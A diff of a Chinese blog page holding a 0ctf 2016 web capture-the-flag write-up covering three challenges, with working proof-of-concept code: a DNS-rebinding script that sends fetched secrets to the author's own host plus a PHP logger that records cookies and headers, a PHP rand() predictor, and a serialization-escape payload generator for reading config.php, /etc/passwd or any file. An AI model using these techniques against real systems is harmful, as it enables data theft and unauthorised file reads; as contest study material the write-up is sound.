@@ -12,6 +12,14 @@
   <!-- css files -->
   <link href="/static/css/default.min.css" rel="stylesheet">
   
+<link href="//cdn.bootcss.com/highlight.js/9.12.0/styles/monokai-sublime.min.css" rel="stylesheet">
+<style>
+    /*.hljs-pre{color:#a6e22e}*/
+    .markdown-body code {
+        background-color: #23241f;
+    }
+</style>
+
   <!-- favicon icon files -->
   <link rel="icon" type="image/x-icon" href="/static/img/favicon.ico">
   <link rel="icon" href="/static/img/favicon.ico">
@@ -96,58 +104,46 @@
             <!-- <div class="clearfix"></div> -->
             <section class="article-content markdown-body">
                 <h2>monkey</h2>
-
 <p>折腾最久就是这道题了，表示很无奈、、脑洞居然是DNS解析、、、给老外的送分题啊</p>
-
 <p><a href="http://www.cloudxns.net/" title="http://www.cloudxns.net/">域名解析商</a></p>
-
-<p>根据页面提示 <strong>$str so that (substr(md5($str), 0, 6) === &#39;c1da58&#39;)</strong>，果断跑数字，成功爆破，最后确定为7-9位左右</p>
-
+<p>根据页面提示 <strong>$str so that (substr(md5($str), 0, 6) === &lsquo;c1da58&rsquo;)</strong>，果断跑数字，成功爆破，最后确定为7-9位左右</p>
 <p>再根据提示<strong>What is Same Origin Policy?</strong>，明显的同源策略</p>
-
 <p>先来一发ajax获取数据：</p>
-
 <h3>js.php or js.html</h3>
-
-<pre><code>&lt;script src=&quot;jquery.min.js&quot;&gt;&lt;/script&gt;
+<pre><code>&lt;script src="jquery.min.js"&gt;&lt;/script&gt;
 &lt;script&gt;
 function getdata(){
     $.ajax({
-        type: &quot;GET&quot;,
-        url:&#39;http://xxx.com:8080/secret&#39;,
+        type: "GET",
+        url:'http://xxx.com:8080/secret',
         async: true,
         error: function(request) {
             getdata();
         },
         success: function(data) {
-            $.get(&#39;http://yourdomain/get.php?data=&#39;+data);
+            $.get('http://yourdomain/get.php?data='+data);
         }
     });
 }
 getdata();
 &lt;/script&gt;
 </code></pre>
-
 <p>再来一发get.php:</p>
-
 <pre><code>&lt;?php
-    $data = &quot;get : &quot;.urldecode(urldecode($_SERVER[&#39;QUERY_STRING&#39;]));
-    $data .= &quot;\r\npost : &quot;.urldecode(urldecode(file_get_contents(&quot;php://input&quot;)));
-    $data .= &quot;\r\nip : &quot;.$_SERVER[&quot;REMOTE_ADDR&quot;];
-    $data .= &quot;\r\nREFERER : &quot;.$_SERVER[&#39;HTTP_REFERER&#39;];
-    $data .= &quot;\r\nHTTP_USER_AGENT : &quot;.$_SERVER[&#39;HTTP_USER_AGENT&#39;];
-    $data .= &quot;\r\nREQUEST_METHOD : &quot;.$_SERVER[&#39;REQUEST_METHOD&#39;];
-    $data .= &quot;\r\nCookies : &quot;.implode(&#39; &#39;,$_COOKIES);
+    $data = "get : ".urldecode(urldecode($_SERVER['QUERY_STRING']));
+    $data .= "\r\npost : ".urldecode(urldecode(file_get_contents("php://input")));
+    $data .= "\r\nip : ".$_SERVER["REMOTE_ADDR"];
+    $data .= "\r\nREFERER : ".$_SERVER['HTTP_REFERER'];
+    $data .= "\r\nHTTP_USER_AGENT : ".$_SERVER['HTTP_USER_AGENT'];
+    $data .= "\r\nREQUEST_METHOD : ".$_SERVER['REQUEST_METHOD'];
+    $data .= "\r\nCookies : ".implode(' ',$_COOKIES);
     if(strlen($data)&gt;10){
-        file_put_contents(&quot;get.txt&quot;,&quot;### &quot;.date(&quot;Y-m-d H:m:s&quot;).&quot; ###\r\n&quot;.$data.&quot;\r\n&quot;, FILE_APPEND);
+        file_put_contents("get.txt","### ".date("Y-m-d H:m:s")." ###\r\n".$data."\r\n", FILE_APPEND);
     }
 ?&gt;
 </code></pre>
-
 <p>最后来一发自动爆破并提交的py：</p>
-
 <h3>monkey_poc.py</h3>
-
 <pre><code>#!/bin/env python
 #-*- encoding: utf-8 -*-
 
@@ -162,88 +158,75 @@ def mx(str):
     m1.update(str)   
     return m1.hexdigest()
 
-if __name__ == &#39;__main__&#39;:
+if __name__ == '__main__':
     r = requests.session()
-    print &#39;start&#39;
-    g = r.get(&quot;http://202.120.7.200/index.php&quot;)
-    m = re.search(r&#39;\(substr\(md5\(\$str\), 0, 6\) === \&#39;([1|2|3|4|5|6|7|8|9|0|a|b|c|d|e|f]{6})\&#39;\)&#39;, g.content).group(1)
-    print &#39;fucking &#39; + m
+    print 'start'
+    g = r.get("http://202.120.7.200/index.php")
+    m = re.search(r'\(substr\(md5\(\$str\), 0, 6\) === \'([1|2|3|4|5|6|7|8|9|0|a|b|c|d|e|f]{6})\'\)', g.content).group(1)
+    print 'fucking ' + m
     for x in range(10000000,100000000):
         a = mx(str(x))[0:6]
         if a == m:
-            print &#39;get string: &#39; + str(x)
-            _data = {&quot;task&quot;:str(x), &quot;url&quot;:&quot;http://xxx.com:8080/fuck.php?a=&quot;+str(x)}
-            b = r.post(&quot;http://202.120.7.200/run.php&quot;,data=_data)
+            print 'get string: ' + str(x)
+            _data = {"task":str(x), "url":"http://xxx.com:8080/fuck.php?a="+str(x)}
+            b = r.post("http://202.120.7.200/run.php",data=_data)
             print b.content
             break
     time.sleep(3)
     i = 120  
     while i:
         if i == 110:
-            print &#39; Please change you dns&#39;
+            print ' Please change you dns'
         else:
             print i
         i = i-1
         time.sleep(1)
-    print &#39;end&#39;
+    print 'end'
 </code></pre>
-
 <p>拿起你的域名、、、找一个牛X的dns解析提供商</p>
-
 <p>运行poc后，根据提示把域名A记录改为127.0.0.1</p>
-
 <p>你的js.php或者js.html需要放在8080端口哦、、、Orz</p>
-
 <p>拼手速+网速的时候到了</p>
-
 <h2>rand_2</h2>
-
 <p>题目源码</p>
-
 <pre><code>&lt;?php
-include(&#39;config.php&#39;);
+include('config.php');
 session_start();
 
-if($_SESSION[&#39;time&#39;] &amp;&amp; time() - $_SESSION[&#39;time&#39;] &gt; 60) {
+if($_SESSION['time'] &amp;&amp; time() - $_SESSION['time'] &gt; 60) {
     session_destroy();
-    die(&#39;timeout&#39;);
+    die('timeout');
 } else {
-    $_SESSION[&#39;time&#39;] = time();
+    $_SESSION['time'] = time();
 }
 
 echo rand();
-if (isset($_GET[&#39;go&#39;])) {
-    $_SESSION[&#39;rand&#39;] = array();
+if (isset($_GET['go'])) {
+    $_SESSION['rand'] = array();
     $i = 5;
-    $d = &#39;&#39;;
+    $d = '';
     while($i--){
         $r = (string)rand();
-        $_SESSION[&#39;rand&#39;][] = $r;
+        $_SESSION['rand'][] = $r;
         $d .= $r;
     }
     echo md5($d);
-} else if (isset($_GET[&#39;check&#39;])) {
-    if ($_GET[&#39;check&#39;] === $_SESSION[&#39;rand&#39;]) {
+} else if (isset($_GET['check'])) {
+    if ($_GET['check'] === $_SESSION['rand']) {
         echo $flag;
     } else {
-        echo &#39;die&#39;;
+        echo 'die';
         session_destroy();
     }
 } else {
     show_source(__FILE__);
 }
 </code></pre>
-
-<p>由于<strong>$<em>GET[&#39;check&#39;] === $</em>SESSION[&#39;rand&#39;]</strong>是<strong>===全等类型</strong>判断，目测无法绕过、脑洞必然在rand()</p>
-
+<p>由于<strong>$_GET[&lsquo;check&rsquo;] === $_SESSION[&lsquo;rand&rsquo;]</strong>是<strong>===全等类型</strong>判断，目测无法绕过、脑洞必然在rand()</p>
 <p>这方面没怎么研究、完全现学现卖、、疯狂地百度</p>
-
 <p>参考文章 ： <a href="http://www.cnblogs.com/wgbs25673578/p/4873269.html" title="随机数产生原理">随机数产生原理</a></p>
-
 <p>队友写的POC</p>
-
-<h3>rand<em>2</em>poc.py</h3>
-
+<h3>rand_2_poc.py</h3>
 <pre><code>#!/bin/env python
 #-*- encoding: utf-8 -*-
 
@@ -254,168 +237,130 @@ while True:
     l = []
     # 获取50个随机rand值并存入list
     for i in range(50):
-        response = r.get(&#39;http://202.120.7.202:8888/&#39;)
-        l.append(int(response.content[:response.content.find(&#39;&lt;&#39;)]))
-    #将$_SESSION[&#39;rand&#39;]这个数组写满5个随机数
-    response = r.get(&#39;http://202.120.7.202:8888/?go&#39;)
+        response = r.get('http://202.120.7.202:8888/')
+        l.append(int(response.content[:response.content.find('&lt;')]))
+    #将$_SESSION['rand']这个数组写满5个随机数
+    response = r.get('http://202.120.7.202:8888/?go')
     #获取将MD5之前的rand随机数存到list
     l.append(int(response.content[:-32]))
-    url = &#39;http://202.120.7.202:8888/?&#39;
+    url = 'http://202.120.7.202:8888/?'
     for i in range(5):
         end = len(l)
         #由随机数生成算法预测下一个随机数
         randNUM = (l[end-3]+l[end-31]) % 2147483648 
         l.append(randNUM)#将新生成的也加入到列表里
         #构造url 传入数组5个预测rand随机数
-        url += &#39;check[]={}&amp;&#39;.format(randNUM)
+        url += 'check[]={}&amp;'.format(randNUM)
     response = r.get(url)#GET请求url 同时传入参数
     #如果输出不是 die 大功告成
-    if &#39;die&#39; not in response.content:
+    if 'die' not in response.content:
         print response.content
         break
 </code></pre>
-
 <h2>piapiapia</h2>
-
 <p>下载源码、通读一遍。</p>
-
 <p>大概可以知道这题的脑洞在于是更新个人资料。</p>
-
 <p>并且，<strong>flag是在config.php中！</strong></p>
-
 <p>在class.php中可以看到filter()过滤函数，update_profile()更新profile函数</p>
-
 <pre><code>public function filter($string) {
-    $escape = array(&#39;\&#39;&#39;, &#39;\\\\&#39;);
-    $escape = &#39;/&#39; . implode(&#39;|&#39;, $escape) . &#39;/&#39;;
-    $string = preg_replace($escape, &#39;_&#39;, $string);
-    $safe = array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);
-    $safe = &#39;/&#39; . implode(&#39;|&#39;, $safe) . &#39;/i&#39;;
-    return preg_replace($safe, &#39;hacker&#39;, $string);
+    $escape = array('\'', '\\\\');
+    $escape = '/' . implode('|', $escape) . '/';
+    $string = preg_replace($escape, '_', $string);
+    $safe = array('select', 'insert', 'update', 'delete', 'where');
+    $safe = '/' . implode('|', $safe) . '/i';
+    return preg_replace($safe, 'hacker', $string);
 }
 </code></pre>
-
-<p><strong>可以知道&#39;和\被替换成_，以及select、insert、update、delete和where被替换成hacker。</strong></p>
-
+<p><strong>可以知道&rsquo;和\被替换成_，以及select、insert、update、delete和where被替换成hacker。</strong></p>
 <pre><code>public function update_profile($username, $new_profile) {
     $username = parent::filter($username);
     $new_profile = parent::filter($new_profile);
-    $where = &quot;username = &#39;$username&#39;&quot;;
-    return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);
+    $where = "username = '$username'";
+    return parent::update($this-&gt;table, 'profile', $new_profile, $where);
 }
 </code></pre>
-
 <p><strong>所更新的资料都是被filter()过滤后的。</strong></p>
-
 <p>在update.php中</p>
-
 <pre><code>$user-&gt;update_profile($username, serialize($profile));
 </code></pre>
-
 <p><strong>更新的profile是警告序列化转换的。</strong></p>
-
 <p>再往上看，用户输入的数据都是经过正则验证的，然而其中有这样一段代码</p>
-
-<pre><code>if(preg_match(&#39;/[^a-zA-Z0-9_]/&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10){
-    die(&#39;Invalid nickname&#39;);
+<pre><code>if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10){
+    die('Invalid nickname');
 }
 </code></pre>
-
 <p>明显和另外两个变量，email和photo不同、此处必定是脑洞！！！</p>
-
 <pre><code>int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )
 返回值
 preg_match()返回 pattern 的匹配次数。   它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后 将会停止搜索。
 如果发生错误preg_match()返回 FALSE。
 </code></pre>
-
 <p><strong>如果发生错误preg_match()返回 FALSE。</strong></p>
-
 <p>当我们输入数组的时候，必定会导致preg_match()返回FALSE，同时让数组长度&lt;10的很简单的，即可以提交<strong>nickname[]=playload</strong></p>
-
 <p>我们提交nickname[]=xxx可以得到序列化语句：</p>
-
-<pre><code>a:4:{s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:17:&quot;email@email.email&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:3:&quot;xxx&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/0cc175b9c0f1b6a831c399e269772661&quot;;}
+<pre><code>a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:17:"email@email.email";s:8:"nickname";a:1:{i:0;s:3:"xxx";}s:5:"photo";s:39:"upload/0cc175b9c0f1b6a831c399e269772661";}
 </code></pre>
-
 <p>根据PHP <strong>unserialize()</strong>的特性（<em>这个是测试出来的</em>），解序列化一个完整序列化语句之后的字符串是会被无视掉的。例如：</p>
-
-<pre><code>unserialize(&#39;a:1:{s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;}&#39;)
+<pre><code>unserialize('a:1:{s:5:"phone";s:11:"12345678901";}')
 </code></pre>
-
 <p>等价于</p>
-
-<pre><code>unserialize(&#39;a:1:{s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;}xxxxxxxxxxxxxxxx&#39;)
+<pre><code>unserialize('a:1:{s:5:"phone";s:11:"12345678901";}xxxxxxxxxxxxxxxx')
 </code></pre>
-
 <p>所以、我们可以构造一个特殊的序列化语句，伪造一个photo路径，就像这样：</p>
-
-<pre><code>a:4:{s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:17:&quot;email@email.email&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:3:&quot;xxx&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/0cc175b9c0f1b6a831c399e269772661&quot;;}
+<pre><code>a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:17:"email@email.email";s:8:"nickname";a:1:{i:0;s:3:"xxx";}s:5:"photo";s:10:"config.php";}s:5:"photo";s:39:"upload/0cc175b9c0f1b6a831c399e269772661";}
 </code></pre>
-
-<p>但是，我们提交的nickname[]=xxx&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php的时候，却是会得到：</p>
-
-<pre><code>a:4:{s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:17:&quot;email@email.email&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:34:&quot;xxx&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/0cc175b9c0f1b6a831c399e269772661&quot;;}
+<p>但是，我们提交的nickname[]=xxx&rdquo;;}s:5:&rdquo;photo&rdquo;;s:10:&rdquo;config.php的时候，却是会得到：</p>
+<pre><code>a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:17:"email@email.email";s:8:"nickname";a:1:{i:0;s:34:"xxx";}s:5:"photo";s:10:"config.php";}s:5:"photo";s:39:"upload/0cc175b9c0f1b6a831c399e269772661";}
 </code></pre>
-
 <p>即</p>
-
-<pre><code>a:1:{i:0;s:34:&quot;xxx&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}
+<pre><code>a:1:{i:0;s:34:"xxx";}s:5:"photo";s:10:"config.php";}
 </code></pre>
-
-<p>我们需要逃逸<strong>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php</strong>这31个字符</p>
-
+<p>我们需要逃逸<strong>&rdquo;;}s:5:&rdquo;photo&rdquo;;s:10:&rdquo;config.php</strong>这31个字符</p>
 <p>这时、猛然发现filter()中，把where替换成hacker明显逃逸了一个字符。。。。。脑洞完全暴露</p>
-
-<p>当 &#39;where&#39;<em>n+&#39;&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&#39; == &#39;hacker&#39;</em>n 的时候，就可以成功逃逸</p>
-
+<p>当 &lsquo;where&rsquo;<em>n+&rsquo;&ldquo;;}s:5:&rdquo;photo&rdquo;;s:10:&rdquo;config.php&rsquo; == &lsquo;hacker&rsquo;</em>n 的时候，就可以成功逃逸</p>
 <p>得到playload：</p>
-
-<pre><code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php
+<pre><code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php
 </code></pre>
-
 <h3>piapiapia_poc.py</h3>
-
 <pre><code>#!/bin/env python
 #-*- encoding: utf-8 -*-
 
 def getflag():
-    playload = &#39;&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&#39;
-    w = &#39;where&#39;
-    h = &#39;hacker&#39;
+    playload = '";}s:5:"photo";s:10:"config.php'
+    w = 'where'
+    h = 'hacker'
     for i in range(100):
         if len(w*i +playload) == len(h*i):
-            print &#39;Playload is :\r\n\t&#39;+w*i +playload+&#39;\r\n&#39;
+            print 'Playload is :\r\n\t'+w*i +playload+'\r\n'
             break
 
 def getpasswd():
-    playload = &#39;&quot;;}s:5:&quot;photo&quot;;s:11:&quot;/etc/passwd&#39;
-    w = &#39;where&#39;
-    h = &#39;hacker&#39;
+    playload = '";}s:5:"photo";s:11:"/etc/passwd'
+    w = 'where'
+    h = 'hacker'
     for i in range(100):
         if len(w*i +playload) == len(h*i):
-            print &#39;Playload is :\r\n\t&#39;+w*i +playload+&#39;\r\n&#39;
+            print 'Playload is :\r\n\t'+w*i +playload+'\r\n'
             break
 
 def getany(f):
-    playload = &#39;&quot;;}s:5:&quot;photo&quot;;s:&#39;+str(len(f))+&#39;:&quot;&#39;+f
-    w = &#39;where&#39;
-    h = &#39;hacker&#39;
+    playload = '";}s:5:"photo";s:'+str(len(f))+':"'+f
+    w = 'where'
+    h = 'hacker'
     for i in range(100):
         if len(w*i +playload) == len(h*i):
-            print &#39;Playload is :\r\n\t&#39;+w*i +playload+&#39;\r\n&#39;
+            print 'Playload is :\r\n\t'+w*i +playload+'\r\n'
             break
     update(w*i +playload)
 
-if __name__ == &#39;__main__&#39;:
-    print &#39;get flag playload:\r\n&#39;
+if __name__ == '__main__':
+    print 'get flag playload:\r\n'
     getflag()
-    print &#39;get /ect/passwd playload:\r\n&#39;
+    print 'get /ect/passwd playload:\r\n'
     getpasswd()
-    f = raw_input(&quot;Input filepath what your want to read:&quot;)
+    f = raw_input("Input filepath what your want to read:")
     getany(f)
 </code></pre>
-
             </section>
             <div class="article-copyright">
               <span>本文标题&nbsp;:&nbsp;</span><a href="/2016/03/14/some_web_writeup_for_0ctf_2016.html" target="_blank">0ctf 2016 部分 web writeup</a><br />
